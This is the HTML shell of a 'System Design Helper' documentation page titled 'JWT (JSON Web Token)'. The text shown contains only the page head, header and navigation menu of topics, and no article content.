
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://abhishekghoshh.github.io/system-design-helper/security/jwt/">
      
      
      
      
        
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>JWT (JSON Web Token) - System Design Helper</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  
<meta property="og:type" content="website" />
<meta property="og:title" content="JWT (JSON Web Token) - System Design Helper" />
<meta property="og:image" content="https://abhishekghoshh.github.io/system-design-helper/assets/images/social/security/jwt.png" />
<meta property="og:image:type" content="image/png" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:url" content="https://abhishekghoshh.github.io/system-design-helper/security/jwt/" />
<meta property="twitter:card" content="summary_large_image" />
<meta property="twitter:title" content="JWT (JSON Web Token) - System Design Helper" />
<meta property="twitter:image" content="https://abhishekghoshh.github.io/system-design-helper/assets/images/social/security/jwt.png" />
</head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#jwt-json-web-token" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="System Design Helper" class="md-header__button md-logo" aria-label="System Design Helper" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            System Design Helper
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              JWT (JSON Web Token)
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="lime"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../ai-tools/" class="md-tabs__link">
        
  
  
    
  
  AI Tools

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../behavioural/" class="md-tabs__link">
        
  
  
    
  
  Behavioural

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../developer-experiences/" class="md-tabs__link">
        
  
  
    
  
  Developer Experiences

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../open-source-tools/" class="md-tabs__link">
        
  
  
    
  
  Open Source Tools

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../software-architect/" class="md-tabs__link">
        
  
  
    
  
  Software Architect

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../wisdom/" class="md-tabs__link">
        
  
  
    
  
  Wisdom

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../ai/ai/" class="md-tabs__link">
          
  
  
  AI

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../devops/" class="md-tabs__link">
          
  
  
  DevOps

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../introduction/" class="md-tabs__link">
          
  
  
  Security

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../system-design/courses/" class="md-tabs__link">
          
  
  
  System Design

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="System Design Helper" class="md-nav__button md-logo" aria-label="System Design Helper" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    System Design Helper
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai-tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AI Tools
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../behavioural/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Behavioural
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../developer-experiences/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Developer Experiences
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../open-source-tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Open Source Tools
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../software-architect/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Software Architect
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wisdom/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Wisdom
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    AI
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    AI
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai/ai/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai/ai-agent/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AI Agent
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai/gen-ai/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Gen AI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai/langchain/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    LangChain
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai/langgraph/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    LangGraph
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai/MCP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MCP
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ai/RAG/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    RAG
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    DevOps
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    DevOps
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Security
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            
  
    Security
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Introduction
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../authentication-and-authorization/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Authentication & Authorization
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../oauth/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    OAuth
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rbac/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    RBAC
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sso/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SSO
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssl/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SSL
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../devsecops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    DevSecOps
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../firewall/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Firewall
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10_9" >
        
          
          <label class="md-nav__link" for="__nav_10_9" id="__nav_10_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Certificate
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_10_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    Certificate
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificate/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Introduction
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificate/certificate-authority/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Certificate Authority
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificate/client-certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Client Certificates
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificate/server-certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Server Certificates
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificate/self-signed-certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Self-Signed Certificates
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificate/links/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Links
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10_10" >
        
          
          <label class="md-nav__link" for="__nav_10_10" id="__nav_10_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Reverse Proxy
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_10_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10_10">
            <span class="md-nav__icon md-icon"></span>
            
  
    Reverse Proxy
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../reverse-proxy/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Introduction
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../reverse-proxy/haproxy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    HAProxy
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../reverse-proxy/nginx/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Nginx
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
        
          
          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    System Design
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11">
            <span class="md-nav__icon md-icon"></span>
            
  
    System Design
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/courses/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Courses
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
        
          
          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    High Level Design
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    High Level Design
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2_2" >
        
          
          <label class="md-nav__link" for="__nav_11_2_2" id="__nav_11_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Concepts
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_11_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Concepts
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/concepts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Concepts
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/adaptive-bitrate-streaming/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Adaptive Bitrate Streaming
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/api/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    API
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/asynchronus-communication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Asynchronous Communication
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/back-of-envelope-calculation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Back of Envelope Calculation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/bloom-filters/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Bloom Filters
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/cap-theorm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CAP Theorem
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/cdc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CDC
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/cdn/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CDN
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/clean-architecture/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Clean Architecture
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/code-documentation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Code Documentation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/consistent-hashing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Consistent Hashing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/cqrs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CQRS
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/database-indexing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Database Indexing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/distributed-caches-and-caching-strategies/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Distributed Caches & Caching Strategies
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Distributed Transaction & Concurrency Control
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/event-sourcing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Event Sourcing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/hashing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Hashing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/load-balancer-and-proxy-server/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Load Balancer & Proxy Server
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/microservices-patterns/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Microservices Patterns
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/networking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Networking
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/passwords/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Passwords
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/process/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Process
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
